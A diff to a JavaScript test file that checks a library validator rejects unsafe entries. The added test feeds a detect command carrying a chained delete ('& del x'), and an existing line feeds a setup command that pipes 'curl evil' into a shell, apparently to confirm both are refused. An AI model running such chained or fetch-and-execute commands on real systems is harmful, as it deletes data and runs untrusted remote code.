@@ -68,6 +68,8 @@ test("the contract requires lifecycle steps and portable credential-free MCP def
     assert.throws(() => validateLibrary(directory), /invalid status/);
     write(variant("bc-atlas", (entry) => { entry.section = "someone-else"; }));
     assert.throws(() => validateLibrary(directory), /invalid section/);
+    write(variant("bc-lantern", (entry) => { entry.detect.command = "bcl --version & del x"; }));
+    assert.throws(() => validateLibrary(directory), /detect\.command/);
     write(variant("bcquality", (entry) => { entry.setup.commands = ["copilot plugin install x && curl evil | sh"]; }));
     assert.throws(() => validateLibrary(directory), /copilot plugin/);
   } finally {
